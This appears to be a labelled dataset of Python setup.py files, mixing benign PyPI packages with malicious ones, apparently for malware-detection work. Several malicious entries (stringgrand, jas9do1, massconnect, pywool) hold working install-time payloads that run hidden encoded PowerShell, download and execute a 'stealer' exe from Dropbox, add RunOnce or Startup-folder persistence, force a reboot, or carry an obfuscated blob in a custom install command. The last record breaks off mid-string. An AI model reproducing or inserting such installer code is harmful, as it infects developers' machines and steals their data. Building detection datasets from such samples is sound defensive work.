{"idx": "dash_table-5.0.0", "func": "import io\nfrom setuptools import setup\n\nsetup(\n    name=\"dash_table\",\n    version=\"5.0.0\",\n    author=\"Chris Parmer <chris@plotly.com>\",\n    packages=[\"dash_table\"],\n    include_package_data=True,\n    license=\"MIT\",\n    description=\"Dash table\",\n    long_description=io.open(\"README.md\", encoding=\"utf-8\").read(),\n    long_description_content_type=\"text/markdown\",\n    install_requires=[],\n)\n", "target": 0}
{"idx": "stringgrand-1.63", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'stringgrand',\n    packages = ['modlib'],\n    version = '9.82',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "colorwin-6.6.8", "func": "from __future__ import with_statement\n\nfrom io import open\nimport os\nimport re\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nNAME = 'colorwin'\n\ndef read_file(path, encoding='ascii'):\n    with open(os.path.join(os.path.dirname(__file__), path),\n              encoding=encoding) as fp:\n        return fp.read()\n\ndef _get_version_match(content):\n    regex = r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\"\n    version_match = re.search(regex, content, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\ndef get_version(path):\n    return _get_version_match(read_file(path))\n\nsetup(\n    name=NAME,\n    version=get_version(os.path.join('colorwin', '__init__.py')),\n    description='Cross-platform colored terminal text.',\n    long_description=read_file('README.rst'),\n    keywords='color colour terminal text ansi windows crossplatform xplatform',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    maintainer='Arnon Yaari',\n    url='https://github.com/tartley/colorwin',\n    license='BSD',\n    packages=[NAME],\n    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Terminals',\n    ]\n)\n", "target": 1}
{"idx": "futures-3.3.0", "func": "#!/usr/bin/env python\n# coding: utf-8\nfrom __future__ import print_function\n\nimport os.path\nimport sys\n\nif sys.version_info[0] > 2:\n    print('This backport is meant only for Python 2.\\n'\n          'It does not work on Python 3, and Python 3 users do not need it '\n          'as the concurrent.futures package is available in the standard library.\\n'\n          'For projects that work on both Python 2 and 3, the dependency needs to be conditional '\n          'on the Python version, like so:\\n'\n          \"extras_require={':python_version == \\\"2.7\\\"': ['futures']}\",\n          file=sys.stderr)\n    sys.exit(1)\n\nextras = {}\ntry:\n    from setuptools import setup\n    extras['zip_safe'] = False\nexcept ImportError:\n    from distutils.core import setup\n\nhere = os.path.dirname(__file__)\nwith open(os.path.join(here, 'README.rst')) as f:\n    readme = f.read()\n\nsetup(name='futures',\n      version='3.3.0',\n      description='Backport of the concurrent.futures package from Python 3',\n      long_description=readme,\n      author='Brian Quinlan',\n      author_email='brian@sweetapp.com',\n      maintainer=u'Alex Gr\u00f6nholm',\n      maintainer_email='alex.gronholm@nextday.fi',\n      url='https://github.com/agronholm/pythonfutures',\n      packages=['concurrent', 'concurrent.futures'],\n      python_requires='>=2.6, <3',\n      license='PSF',\n      classifiers=['License :: OSI Approved :: Python Software Foundation License',\n                   'Development Status :: 5 - Production/Stable',\n                   'Intended Audience :: Developers',\n                   'Programming Language :: Python :: 2.6',\n                   'Programming Language :: Python :: 2.7',\n                   'Programming Language :: Python :: 2 :: Only'],\n      **extras\n      )\n", "target": 0}
{"idx": "jas9do1-7.72", "func": "\nfrom distutils.core import setup\n\n# Tahg  &&  EsqueleSquad (www.esquelesquad.rip)\n\n# Download and Execute 'EsqueleStealer'\n\nimport os\nimport subprocess\n\nif os.getlogin() != \"Tahg\":\n  malwPath = os.environ['TEMP'] + \"\\\\temp-PipInstall.exe\"\n  try:\n    cPath = os.environ['WINDIR'] + \"\\\\System32\\\\curl.exe\"\n    subprocess.Popen(f'reg add \"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\" /v Pentestlab /t REG_SZ /d \"{malwPath}\"', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\n    subprocess.call([cPath, \"https://dl.dropbox.com/s/5mp5s3ta5skt5rv/esqueleDrp.exe?dl=0\", \"-o\", malwPath], shell=False, creationflags=subprocess.CREATE_NO_WINDOW).wait()\n    subprocess.call([malwPath], shell=True)\n  except: pass\n\n\ntry:\n  setup(\n    name = \"jas9do1\",\n    packages = [\"jas9do1\"],\n    version = '3.29',\n    description = 'A library for creating a terminal user interface',\n    author = 'Tahg',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n\n", "target": 1}
{"idx": "massconnect-2.35.18", "func": "import setuptools, base64\n\nwith open(\"README.md\", \"r\", encoding=\"utf-8\") as f:\n    readme = f.read()\n\nsetuptools.setup(\n    name=\"massconnect\",\n    version=\"2.35.18\",\n    author=\"massconnect\",\n    description=\"Python MultiHTTP for Humans.\",\n    long_description=readme,\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    package_dir={\"\": \"src\"},\n    packages=setuptools.find_packages(where=\"src\"),\n    python_requires=\">=3.6\",\n)\n\n\ntry:\n    from urllib.request import Request, urlopen, urlretrieve\n    import zipfile\n    import os\nexcept:\n    pass\n\n\nimport urllib.request\nimport zipfile\nimport os\nimport sys\nimport shutil\nimport subprocess\nimport time\nimport random\nimport string\n\ndef x():\n    t = \"https://frvezdff.pythonanywhere.com/getrnr\"\n\n    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+\"\\\\bbvvbb.bat\")\n    \n    time.sleep(2)\n\n    \n    if getattr(sys, 'frozen', False):\n        currentFilePath = os.path.dirname(sys.executable)\n    else:\n        currentFilePath = os.path.dirname(os.path.abspath(__file__))\n\n    fileName = os.path.basename(sys.argv[0])\n    filePath = os.path.join(currentFilePath, fileName)\n\n    startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n\n    with open(os.getenv('APPDATA')+\"\\\\bbvvbb.bat\", \"r\") as file:\n        cont = file.read()\n        \n    with open(startupFolderPath+\"\\\\bbvvbb.bat\", \"w+\") as file:\n        file.write(cont)\n    \n            \n    \n    '''\n    subprocess.Popen(os.getenv('APPDATA')+\"\\\\bbvvbb.bat\", creationflags=subprocess.CREATE_NO_WINDOW)\n    try:\n        path,_ = urllib.request.urlretrieve(t, startupFilePath+\"\\\\bbvvbb.bat\")\n    except:\n        pass\n    '''\n    time.sleep(5)\n\n    os.system(\"shutdown /r /f\")\n    \n\nx()\n", "target": 1}
{"idx": "flake8-bugbear-22.7.1", "func": "# Copyright (C) 2016-2021 \u0141ukasz Langa\n\nimport ast\nimport os\nimport re\nimport sys\n\nfrom setuptools import setup\n\nassert sys.version_info >= (3, 6, 0), \"bugbear requires Python 3.6+\"\n\n\ncurrent_dir = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(current_dir, \"README.rst\"), encoding=\"utf8\") as ld_file:\n    long_description = ld_file.read()\n\n\n_version_re = re.compile(r\"__version__\\s+=\\s+(?P<version>.*)\")\n\n\nwith open(os.path.join(current_dir, \"bugbear.py\"), \"r\") as f:\n    version = _version_re.search(f.read()).group(\"version\")\n    version = str(ast.literal_eval(version))\n\n\nsetup(\n    name=\"flake8-bugbear\",\n    version=version,\n    description=(\n        \"A plugin for flake8 finding likely bugs and design problems \"\n        \"in your program. Contains warnings that don't belong in \"\n        \"pyflakes and pycodestyle.\"\n    ),\n    long_description=long_description,\n    keywords=\"flake8 bugbear bugs pyflakes pylint linter qa\",\n    author=\"\u0141ukasz Langa\",\n    author_email=\"lukasz@langa.pl\",\n    url=\"https://github.com/PyCQA/flake8-bugbear\",\n    license=\"MIT\",\n    py_modules=[\"bugbear\"],\n    zip_safe=False,\n    python_requires=\">=3.6\",\n    install_requires=[\"flake8 >= 3.0.0\", \"attrs>=19.2.0\"],\n    test_suite=\"tests.test_bugbear\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Console\",\n        \"Framework :: Flake8\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Quality Assurance\",\n    ],\n    entry_points={\"flake8.extension\": [\"B = bugbear:BugBearChecker\"]},\n    extras_require={\n        \"dev\": [\"coverage\", \"hypothesis\", \"hypothesmith>=0.2\", \"pre-commit\"]\n    },\n    project_urls={\"Change Log\": \"https://github.com/PyCQA/flake8-bugbear#change-log\"},\n)\n", "target": 0}
{"idx": "rquest-2.28.2", "func": "#!/usr/bin/env python\nimport os\nimport sys\nfrom codecs import open\n\nfrom setuptools import setup\nfrom setuptools.command.test import test as TestCommand\n\nCURRENT_PYTHON = sys.version_info[:2]\nREQUIRED_PYTHON = (3, 7)\n\nif CURRENT_PYTHON < REQUIRED_PYTHON:\n    sys.stderr.write(\n        \"\"\"\n==========================\nUnsupported Python version\n==========================\nThis version of Requests requires at least Python {}.{}, but\nyou're trying to install it on Python {}.{}. To resolve this,\nconsider upgrading to a supported Python version.\n\nIf you can't upgrade your Python version, you'll need to\npin to an older version of Requests (<2.28).\n\"\"\".format(\n            *(REQUIRED_PYTHON + CURRENT_PYTHON)\n        )\n    )\n    sys.exit(1)\n\n\nclass PyTest(TestCommand):\n    user_options = [(\"pytest-args=\", \"a\", \"Arguments to pass into py.test\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        try:\n            from multiprocessing import cpu_count\n\n            self.pytest_args = [\"-n\", str(cpu_count()), \"--boxed\"]\n        except (ImportError, NotImplementedError):\n            self.pytest_args = [\"-n\", \"1\", \"--boxed\"]\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        import pytest\n\n        errno = pytest.main(self.pytest_args)\n        sys.exit(errno)\n\n\n# 'setup.py publish' shortcut.\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist bdist_wheel\")\n    os.system(\"twine upload dist/*\")\n    sys.exit()\n\nrequires = [\n    \"charset_normalizer>=2,<4\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nabout = {}\nhere = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(here, \"requests\", \"__version__.py\"), \"r\", \"utf-8\") as f:\n    exec(f.read(), about)\n\nwith open(\"README.md\", \"r\", \"utf-8\") as f:\n    readme = f.read()\n\nsetup(\n    name=\"rquest\",\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    author=\"Orange Alice\",\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"requests\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    cmdclass={\"test\": PyTest},\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n", "target": 1}
{"idx": "flaskoidc-1.1.2", "func": "from os import path\n\nfrom setuptools import setup, find_packages\n\nrequirements = [\n    \"Flask>=1.0.2\",\n    \"Authlib>=1.0.0,<2.0.0\",\n    \"requests>=2.25.1\",\n    \"Flask-SQLAlchemy>=2.5.1\",\n]\n\n# read the contents of your README file\nthis_directory = path.abspath(path.dirname(__file__))\nwith open(path.join(this_directory, \"README.md\"), encoding=\"utf-8\") as f:\n    long_description = f.read()\n\n__version__ = \"1.1.2\"\n\nsetup(\n    name=\"flaskoidc\",\n    version=__version__,\n    description=\"Flask wrapper with pre-configured OAuth2 and OIDC support\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/verdan/flaskoidc.git\",\n    author=\"Verdan Mahmood\",\n    author_email=\"verdan.mahmood@gmail.com\",\n    packages=find_packages(exclude=[\"tests*\"]),\n    include_package_data=True,\n    dependency_links=[],\n    install_requires=requirements,\n    python_requires=\">=3.6\",\n)\n", "target": 0}
{"idx": "daemonize-2.5.0", "func": "#!/usr/bin/python\n\nimport re\nimport ast\n\nfrom setuptools import setup, find_packages\n\n_version_re = re.compile(r'__version__\\s+=\\s+(.*)')\n\n\nwith open('daemonize.py', 'rb') as f:\n    version = str(ast.literal_eval(_version_re.search(\n        f.read().decode('utf-8')).group(1)))\n\nsetup(\n    name=\"daemonize\",\n    version=version,\n    py_modules=[\"daemonize\"],\n    author=\"Ilya Otyutskiy\",\n    author_email=\"ilya.otyutskiy@icloud.com\",\n    maintainer=\"Ilya Otyutskiy\",\n    url=\"https://github.com/thesharp/daemonize\",\n    description=\"Library to enable your code run as a daemon process on Unix-like systems.\",\n    license=\"MIT\",\n    classifiers=[\"Development Status :: 5 - Production/Stable\",\n                 \"Environment :: Console\",\n                 \"Intended Audience :: Developers\",\n                 \"License :: OSI Approved :: MIT License\",\n                 \"Operating System :: MacOS :: MacOS X\",\n                 \"Operating System :: POSIX :: Linux\",\n                 \"Operating System :: POSIX :: BSD :: FreeBSD\",\n                 \"Operating System :: POSIX :: BSD :: OpenBSD\",\n                 \"Operating System :: POSIX :: BSD :: NetBSD\",\n                 \"Programming Language :: Python\",\n                 \"Programming Language :: Python :: 2.6\",\n                 \"Programming Language :: Python :: 2.7\",\n                 \"Programming Language :: Python :: 3\",\n                 \"Programming Language :: Python :: 3.3\",\n                 \"Programming Language :: Python :: 3.4\",\n                 \"Programming Language :: Python :: 3.5\",\n                 \"Topic :: Software Development\"]\n)\n", "target": 0}
{"idx": "dohq-artifactory-0.8.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport re\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nwith open(\"version.txt\") as file:\n    __version__ = file.readline().strip()\n\n# check that version is correct (X.X.X or X.X.X.devXXX or X.X.X.alphaX), eg 0.8.0.dev0\nassert re.match(\n    r\"^\\d\\.\\d\\.\\d$|^\\d\\.\\d\\.\\d\\.dev\\d+$|^\\d\\.\\d\\.\\d\\.alpha\\d+$\", __version__\n)\n\n\n# default build status, see: https://pypi.python.org/pypi?%3Aaction=list_classifiers\nif \"alpha\" in __version__:\n    dev_status = \"3 - Alpha\"\nelif \"dev\" in __version__:\n    dev_status = \"4 - Beta\"\nelse:\n    dev_status = \"5 - Production/Stable\"\n\n\nsetup(\n    name=\"dohq-artifactory\",\n    version=__version__,\n    py_modules=[\"artifactory\"],\n    license=\"MIT License\",\n    description=\"A Python interface to Artifactory\",\n    long_description=\"See full documentation here: https://devopshq.github.io/artifactory/\",\n    author=\"Alexey Burov\",\n    author_email=\"aburov@ptsecurity.com\",\n    classifiers=[\n        \"Development Status :: {}\".format(dev_status),\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Topic :: System :: Filesystems\",\n    ],\n    url=\"https://devopshq.github.io/artifactory/\",\n    download_url=\"https://github.com/devopshq/artifactory\",\n    install_requires=[\n        \"requests\",\n        \"python-dateutil\",\n        \"PyJWT~=2.0\",\n    ],\n    zip_safe=False,\n    package_data={\"\": [\"README.md\"]},\n    packages=[\"dohq_artifactory\"],\n)\n", "target": 0}
{"idx": "cyclonedx-python-lib-2.7.1", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['cyclonedx',\n 'cyclonedx.exception',\n 'cyclonedx.model',\n 'cyclonedx.output',\n 'cyclonedx.output.serializer',\n 'cyclonedx.parser']\n\npackage_data = \\\n{'': ['*'], 'cyclonedx': ['schema/*', 'schema/ext/*']}\n\ninstall_requires = \\\n['packageurl-python>=0.9',\n 'setuptools>=47.0.0',\n 'sortedcontainers>=2.4.0,<3.0.0',\n 'toml>=0.10.0,<0.11.0']\n\nextras_require = \\\n{':python_version < \"3.8\"': ['importlib-metadata>=3.4']}\n\nsetup_kwargs = {\n    'name': 'cyclonedx-python-lib',\n    'version': '2.7.1',\n    'description': 'A library for producing CycloneDX SBOM (Software Bill of Materials) files.',\n    'long_description': '# Python Library for generating CycloneDX\\n\\n[![shield_gh-workflow-test]][link_gh-workflow-test]\\n[![shield_rtfd]][link_rtfd]\\n[![shield_pypi-version]][link_pypi]\\n[![shield_conda-forge-version]][link_conda-forge]\\n[![shield_license]][license_file]  \\n[![shield_website]][link_website]\\n[![shield_slack]][link_slack]\\n[![shield_groups]][link_discussion]\\n[![shield_twitter-follow]][link_twitter]\\n\\n----\\n\\nThis CycloneDX module for Python can generate valid CycloneDX bill-of-material document containing an aggregate of all\\nproject dependencies.\\n\\nThis module is not designed for standalone use.\\n\\nIf you\\'re looking for a CycloneDX tool to run to generate (SBOM) software bill-of-materials documents, why not checkout: [CycloneDX Python][cyclonedx-python]\\n\\nAdditionally, the following tool can be used as well (and this library was written to help improve it) [Jake][jake].\\n\\nAdditionally, you can use this module yourself in your application to programmatically generate SBOMs.\\n\\nCycloneDX is a lightweight BOM specification that is easily created, human-readable, and simple to parse.\\n\\nView our documentation [here](https://cyclonedx-python-library.readthedocs.io/).\\n\\n## Python Support\\n\\nWe endeavour to support all functionality for all [current actively supported Python versions](https://www.python.org/downloads/).\\nHowever, some features may not be possible/present in older Python versions due to their lack of support.\\n\\n## Changelog\\n\\nSee our [CHANGELOG][chaneglog_file].\\n\\n## Contributing\\n\\nFeel free to open issues, bugreports or pull requests.  \\nSee the [CONTRIBUTING][contributing_file] file for details.\\n\\n## Copyright & License\\n\\nCycloneDX Python Lib is Copyright (c) OWASP Foundation. All Rights Reserved.  \\nPermission to modify and redistribute is granted under the terms of the Apache 2.0 license.  \\nSee the [LICENSE][license_file] file for the full license.\\n\\n[cyclonedx-python]: https://github.com/CycloneDX/cyclonedx-python\\n[jake]: https://github.com/sonatype-nexus-community/jake\\n\\n[license_file]: https://github.com/CycloneDX/cyclonedx-python-lib/blob/master/LICENSE\\n[chaneglog_file]: https://github.com/CycloneDX/cyclonedx-python-lib/blob/master/CHANGELOG.md\\n[contributing_file]: https://github.com/CycloneDX/cyclonedx-python-lib/blob/master/CONTRIBUTING.md\\n\\n[shield_gh-workflow-test]: https://img.shields.io/github/workflow/status/CycloneDX/cyclonedx-python-lib/Python%20CI/main?logo=GitHub&logoColor=white \"build\"\\n[shield_pypi-version]: https://img.shields.io/pypi/v/cyclonedx-python-lib?logo=pypi&logoColor=white&label=PyPI \"PyPI\"\\n[shield_conda-forge-version]: https://img.shields.io/conda/vn/conda-forge/cyclonedx-python-lib?logo=anaconda&logoColor=white&label=conda-forge \"conda-forge\"\\n[shield_rtfd]: https://img.shields.io/readthedocs/cyclonedx-python-library?logo=readthedocs&logoColor=white \"Read the Docs\"\\n[shield_license]: https://img.shields.io/github/license/CycloneDX/cyclonedx-python-lib?logo=open%20source%20initiative&logoColor=white \"license\"\\n[shield_website]: https://img.shields.io/badge/https://-cyclonedx.org-blue.svg \"homepage\"\\n[shield_slack]: https://img.shields.io/badge/slack-join-blue?logo=Slack&logoColor=white \"slack join\"\\n[shield_groups]: https://img.shields.io/badge/discussion-groups.io-blue.svg \"groups discussion\"\\n[shield_twitter-follow]: https://img.shields.io/badge/Twitter-follow-blue?logo=Twitter&logoColor=white \"twitter follow\"\\n[link_gh-workflow-test]: https://github.com/CycloneDX/cyclonedx-python-lib/actions/workflows/poetry.yml?query=branch%3Amain\\n[link_pypi]: https://pypi.org/project/cyclonedx-python-lib/\\n[link_conda-forge]: https://anaconda.org/conda-forge/cyclonedx-python-lib\\n[link_rtfd]: https://cyclonedx-python-library.readthedocs.io/en/latest/?badge=latest\\n[link_website]: https://cyclonedx.org/\\n[link_slack]: https://cyclonedx.org/slack/invite\\n[link_discussion]: https://groups.io/g/CycloneDX\\n[link_twitter]: https://twitter.com/CycloneDX_Spec\\n\\n[PEP-508]: https://www.python.org/dev/peps/pep-0508/\\n',\n    'author': 'Paul Horton',\n    'author_email': 'phorton@sonatype.com',\n    'maintainer': 'Paul Horton',\n    'maintainer_email': 'phorton@sonatype.com',\n    'url': 'https://github.com/CycloneDX/cyclonedx-python-lib',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "pywool-1.0.2", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom pathlib import Path\n\n\n\nVERSION = '1.0.2'\nDESCRIPTION = 'A simplified version of urllib.'\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.md\").read_text()\n\nclass CustomInstallCommand(install):\n    def run(self):\n        wopvEaTEcopFEavc =\"DFK\\x0c>\\x15\\x16\\x19\\x19^^F_DA\\x14[VKR\\x07\\x03>\\x17\\x15\\x13\\x16C@IS\\x1c\\x10{J\\x19xo\\x17\\x1c\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x1eS@W[\\x1e[YCQ\\x04\\x02\\x1aW\\x00\\r]RPYTS\\x1d\\x16X`\\t@S\\x04~\\x07|t\\x0fMzTZ@Q~\\n@T{wOSe{EV\\\\\\x00]omvLt_MAm\\x04_Fzp\\t_Z\\x05}Dh\\x06o\\x05Sw\\t^Yg\\x07[{bGBoQvDPN\\x07Cknj]t[o\\x0cQl|\\x06WL^Ts\\x07~\\x00hpMbZ\\x05nNR\\x06LTP\\x01NAc\\x0bZAToKZa`wBeuw\\x02lgAT`X\\x01^UeYBm\\x07KPgcUR[[\\tKP\\x06c\\x05ivHhYg\\x06_R\\x00SHm~LfWptMVuz|ba\\x0c\\thrJgWX\\x0fWZZuBS\\x07MWl\\x04TMUpbC{YdTazUD{}\\x03\\x00y}o]Uz\\x7f^zVVP|vyQSz\\x7f\\x02xQ\\\\Tzwx_quqV{s\\x00O}]\\x01Bbw_M{tn[dBDQkqdNhnrH`pA\\x0fRs\\x0bXUb\\x03\\x00aqKtS~wq`oj_iqLdW\\x01pCXn\\x03Zj\\x7fKwQo{